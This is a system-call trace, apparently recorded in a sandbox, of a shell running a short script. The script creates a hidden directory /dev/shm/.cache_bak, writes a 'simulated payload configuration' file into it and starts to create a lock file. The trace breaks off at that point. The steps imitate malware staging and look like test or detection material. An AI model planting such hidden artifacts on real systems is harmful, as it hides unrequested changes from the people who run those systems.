9     10:07:55.118059 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.118679 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.119285 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.119907 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.120552 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.121164 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.121786 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.122407 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.123025 read(0<pipe:[79132]>, "_", 1) = 1
9     10:07:55.123648 read(0<pipe:[79132]>, "b", 1) = 1
9     10:07:55.124284 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.125028 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:55.125552 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.126148 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:55.126718 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/mkdir", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.127278 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/mkdir", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.127835 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/mkdir", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.128415 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
9     10:07:55.129026 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
9     10:07:55.129567 geteuid()         = 1001
9     10:07:55.130124 getegid()         = 1001
9     10:07:55.130651 getuid()          = 1001
9     10:07:55.131240 getgid()          = 1001
9     10:07:55.131871 access("/usr/bin/mkdir", X_OK) = 0
9     10:07:55.132570 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
9     10:07:55.133230 geteuid()         = 1001
9     10:07:55.133796 getegid()         = 1001
9     10:07:55.134294 getuid()          = 1001
9     10:07:55.134740 getgid()          = 1001
9     10:07:55.135271 access("/usr/bin/mkdir", R_OK) = 0
9     10:07:55.135862 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:55.136396 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     10:07:55.136934 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7201ca25fe50) = 19
19    10:07:55.137865 set_robust_list(0x7201ca25fe60, 24 <unfinished ...>
9     10:07:55.138082 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
19    10:07:55.138352 <... set_robust_list resumed>) = 0
9     10:07:55.138609 <... rt_sigprocmask resumed>NULL, 8) = 0
19    10:07:55.138846 getpid( <unfinished ...>
9     10:07:55.139119 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
19    10:07:55.139375 <... getpid resumed>) = 19
9     10:07:55.139563 <... rt_sigprocmask resumed>[], 8) = 0
19    10:07:55.139845 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     10:07:55.140149 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
19    10:07:55.140360 <... rt_sigprocmask resumed>NULL, 8) = 0
9     10:07:55.140637 <... rt_sigprocmask resumed>NULL, 8) = 0
19    10:07:55.140858 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.141060 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
19    10:07:55.141320 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.141555 <... rt_sigprocmask resumed>[], 8) = 0
19    10:07:55.141781 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.142019 rt_sigaction(SIGINT, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
19    10:07:55.142260 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.142490 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
19    10:07:55.142694 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.142869 wait4(-1,  <unfinished ...>
19    10:07:55.143050 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
19    10:07:55.143289 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
19    10:07:55.143693 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
19    10:07:55.144155 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, 8) = 0
19    10:07:55.144708 execve("/usr/bin/mkdir", ["mkdir", "-p", "/dev/shm/.cache_bak"], 0x5dc497af3550 /* 8 vars */) = 0
19    10:07:55.145856 brk(NULL)         = 0x61ce49da6000
19    10:07:55.146527 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7816afb69000
19    10:07:55.147037 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
19    10:07:55.148128 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
19    10:07:55.148978 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
19    10:07:55.149972 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7816afb64000
19    10:07:55.150385 mmap(0x7816afb65000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7816afb65000
19    10:07:55.150833 mmap(0x7816afb66000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7816afb66000
19    10:07:55.151234 mmap(0x7816afb67000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7816afb67000
19    10:07:55.151678 close(3</usr/lib/libfake_tracer.so>) = 0
19    10:07:55.152081 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
19    10:07:55.152533 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
19    10:07:55.152941 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
19    10:07:55.153324 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7816afb62000
19    10:07:55.153744 close(3</etc/ld.so.cache>) = 0
19    10:07:55.154209 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>
19    10:07:55.154680 read(3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
19    10:07:55.155132 fstat(3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, {st_mode=S_IFREG|0644, st_size=174472, ...}) = 0
19    10:07:55.155590 mmap(NULL, 181960, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, 0) = 0x7816afb35000
19    10:07:55.156023 mmap(0x7816afb3b000, 118784, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, 0x6000) = 0x7816afb3b000
19    10:07:55.156685 mmap(0x7816afb58000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, 0x23000) = 0x7816afb58000
19    10:07:55.157260 mmap(0x7816afb5e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, 0x29000) = 0x7816afb5e000
19    10:07:55.157762 mmap(0x7816afb60000, 5832, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7816afb60000
19    10:07:55.158232 close(3</usr/lib/x86_64-linux-gnu/libselinux.so.1>) = 0
19    10:07:55.158674 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
19    10:07:55.159201 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
19    10:07:55.159677 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
19    10:07:55.160219 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
19    10:07:55.160678 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
19    10:07:55.161151 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x7816af923000
19    10:07:55.161789 mmap(0x7816af94b000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7816af94b000
19    10:07:55.162491 mmap(0x7816afad3000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x7816afad3000
19    10:07:55.163075 mmap(0x7816afb22000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x7816afb22000
19    10:07:55.163736 mmap(0x7816afb28000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7816afb28000
19    10:07:55.164353 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
19    10:07:55.164857 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>
19    10:07:55.165452 read(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
19    10:07:55.166156 fstat(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, {st_mode=S_IFREG|0644, st_size=625344, ...}) = 0
19    10:07:55.166792 mmap(NULL, 627472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0) = 0x7816af889000
19    10:07:55.167459 mmap(0x7816af88b000, 450560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x2000) = 0x7816af88b000
19    10:07:55.168042 mmap(0x7816af8f9000, 163840, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x70000) = 0x7816af8f9000
19    10:07:55.168665 mmap(0x7816af921000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x97000) = 0x7816af921000
19    10:07:55.169299 close(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>) = 0
19    10:07:55.170018 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7816af887000
19    10:07:55.170658 arch_prctl(ARCH_SET_FS, 0x7816af887dc0) = 0
19    10:07:55.171202 set_tid_address(0x7816af888090) = 19
19    10:07:55.171823 set_robust_list(0x7816af8880a0, 24) = 0
19    10:07:55.172396 rseq(0x7816af8886e0, 0x20, 0, 0x53053053) = 0
19    10:07:55.172951 mprotect(0x7816afb22000, 16384, PROT_READ) = 0
19    10:07:55.173501 mprotect(0x7816af921000, 4096, PROT_READ) = 0
19    10:07:55.174151 mprotect(0x7816afb5e000, 4096, PROT_READ) = 0
19    10:07:55.174725 mprotect(0x7816afb67000, 4096, PROT_READ) = 0
19    10:07:55.175313 mprotect(0x61ce11012000, 4096, PROT_READ) = 0
19    10:07:55.175812 mprotect(0x7816afba1000, 8192, PROT_READ) = 0
19    10:07:55.176474 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
19    10:07:55.177154 munmap(0x7816afb62000, 7295) = 0
19    10:07:55.177864 statfs("/sys/fs/selinux", {f_type=SYSFS_MAGIC, f_bsize=4096, f_blocks=0, f_bfree=0, f_bavail=0, f_files=0, f_ffree=0, f_fsid={val=[0x44535bd0, 0xcd0f59b1]}, f_namelen=255, f_frsize=4096, f_flags=ST_VALID|ST_RDONLY|ST_NOSUID|ST_NODEV|ST_NOEXEC|ST_RELATIME}) = 0
19    10:07:55.178483 statfs("/selinux", 0x7fffb7946f00) = -1 ENOENT (No such file or directory)
19    10:07:55.179078 getrandom("\xfe\xd5\x56\x67\x79\xf3\xde\x86", 8, GRND_NONBLOCK) = 8
19    10:07:55.179594 brk(NULL)         = 0x61ce49da6000
19    10:07:55.180192 brk(0x61ce49dc7000) = 0x61ce49dc7000
19    10:07:55.180745 openat(AT_FDCWD</sandbox>, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3</proc/filesystems>
19    10:07:55.181334 fstat(3</proc/filesystems>, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
19    10:07:55.181945 read(3</proc/filesystems>, "nodev\tsysfs\nnodev\ttmpfs\nnodev\tbd"..., 1024) = 440
19    10:07:55.182695 close(3</proc/filesystems>) = 0
19    10:07:55.183267 openat(AT_FDCWD</sandbox>, "/proc/mounts", O_RDONLY|O_CLOEXEC) = 3</proc/19/mounts>
19    10:07:55.183910 fstat(3</proc/19/mounts>, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
19    10:07:55.184557 read(3</proc/19/mounts>, "overlay / overlay rw,relatime,lo"..., 1024) = 1024
19    10:07:55.185119 read(3</proc/19/mounts>, "r.v1.overlayfs/snapshots/1071/fs"..., 1024) = 1024
19    10:07:55.185848 read(3</proc/19/mounts>, ",msize=65536,trans=fd,rfd=5,wfd="..., 1024) = 891
19    10:07:55.186591 read(3</proc/19/mounts>, "", 1024) = 0
19    10:07:55.187147 close(3</proc/19/mounts>) = 0
19    10:07:55.187660 access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
19    10:07:55.188301 umask(000)        = 022
19    10:07:55.188900 umask(022)        = 000
19    10:07:55.189464 mkdir("/dev", 0777) = -1 EEXIST (File exists)
19    10:07:55.190015 chdir("/dev")     = 0
19    10:07:55.190513 mkdir("shm", 0777) = -1 EEXIST (File exists)
19    10:07:55.191115 chdir("shm")      = 0
19    10:07:55.191635 mkdir(".cache_bak", 0777) = 0
19    10:07:55.192226 close(1<pipe:[78065]>) = 0
19    10:07:55.192802 close(2<pipe:[78066]>) = 0
19    10:07:55.193569 exit_group(0)     = ?
19    10:07:55.194733 +++ exited with 0 +++
9     10:07:55.194964 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 19
9     10:07:55.195219 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.195696 ioctl(2<pipe:[78066]>, TIOCGWINSZ, 0x7ffe4bfa9910) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:55.196208 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:55.196779 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=19, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     10:07:55.197064 wait4(-1, 0x7ffe4bfa9290, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     10:07:55.197543 rt_sigreturn({mask=[]}) = 0
9     10:07:55.198020 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.198601 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.199351 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.199965 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.200599 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.201124 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.201806 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.202440 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.203062 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.203575 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.204091 read(0<pipe:[79132]>, "S", 1) = 1
9     10:07:55.204647 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.205136 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.205624 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.206126 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.206631 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.207174 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.207680 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.208185 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.208680 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.209221 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.209879 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.210485 read(0<pipe:[79132]>, "y", 1) = 1
9     10:07:55.210998 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.211494 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.211988 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.212519 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.213009 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.213522 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.214190 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.215243 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.219323 read(0<pipe:[79132]>, "f", 1) = 1
9     10:07:55.224952 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.227192 read(0<pipe:[79132]>, "g", 1) = 1
9     10:07:55.229363 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.230775 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.231983 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.232991 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.233846 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.234548 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.235264 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.235924 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.236587 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.237269 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.237932 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.238601 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.239208 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.239787 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.240384 read(0<pipe:[79132]>, ">", 1) = 1
9     10:07:55.240962 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.241485 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.242127 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.242810 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.243473 read(0<pipe:[79132]>, "v", 1) = 1
9     10:07:55.244240 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.244879 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.245557 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.246170 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.246786 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.247403 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.248048 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.248715 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.249526 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.250278 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.250892 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.251423 read(0<pipe:[79132]>, "_", 1) = 1
9     10:07:55.251985 read(0<pipe:[79132]>, "b", 1) = 1
9     10:07:55.252528 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.253094 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:55.253602 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.254111 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.254629 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.255137 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.255651 read(0<pipe:[79132]>, "f", 1) = 1
9     10:07:55.256213 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.256721 read(0<pipe:[79132]>, "g", 1) = 1
9     10:07:55.257224 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.257731 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.258243 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.258888 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.259445 read(0<pipe:[79132]>, "f", 1) = 1
9     10:07:55.259959 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.260543 openat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/config.conf", O_WRONLY|O_CREAT|O_TRUNC, 000) = 3</dev/shm/.cache_bak/config.conf>
9     10:07:55.261100 fcntl(1<pipe:[78065]>, F_GETFD) = 0
9     10:07:55.261756 fcntl(1<pipe:[78065]>, F_DUPFD, 10) = 10<pipe:[78065]>
9     10:07:55.262338 fcntl(1<pipe:[78065]>, F_GETFD) = 0
9     10:07:55.262841 fcntl(10<pipe:[78065]>, F_SETFD, FD_CLOEXEC) = 0
9     10:07:55.263425 dup2(3</dev/shm/.cache_bak/config.conf>, 1<pipe:[78065]>) = 1</dev/shm/.cache_bak/config.conf>
9     10:07:55.263965 close(3</dev/shm/.cache_bak/config.conf>) = 0
9     10:07:55.264522 fstat(1</dev/shm/.cache_bak/config.conf>, {st_mode=S_IFREG|000, st_size=0, ...}) = 0
9     10:07:55.265034 write(1</dev/shm/.cache_bak/config.conf>, "Simulated payload configuration "..., 37) = 37
9     10:07:55.265706 dup2(10<pipe:[78065]>, 1</dev/shm/.cache_bak/config.conf>) = 1<pipe:[78065]>
9     10:07:55.266433 fcntl(10<pipe:[78065]>, F_GETFD) = 0x1 (flags FD_CLOEXEC)
9     10:07:55.266997 close(10<pipe:[78065]>) = 0
9     10:07:55.267507 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.267993 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.268492 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.268982 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.269480 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.269982 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.270478 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.270962 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.271447 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.271930 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.272441 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.272939 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.273659 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.274452 read(0<pipe:[79132]>, "v", 1) = 1
9     10:07:55.275033 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.275529 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.276017 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.276548 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.277041 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.277644 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.278108 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.278611 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.279099 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.279615 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.280136 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.280670 read(0<pipe:[79132]>, "_", 1) = 1
9     10:07:55.281170 read(0<pipe:[79132]>, "b", 1) = 1
9     10:07:55.281672 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.282265 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:55.282991 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.283575 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.284273 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.284841 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.285415 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.285982 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.286546 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.287143 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.287679 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.288295 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.288845 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.289392 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:55.290079 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.290657 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:55.291065 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/touch", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.291456 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/touch", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.291835 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/touch", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
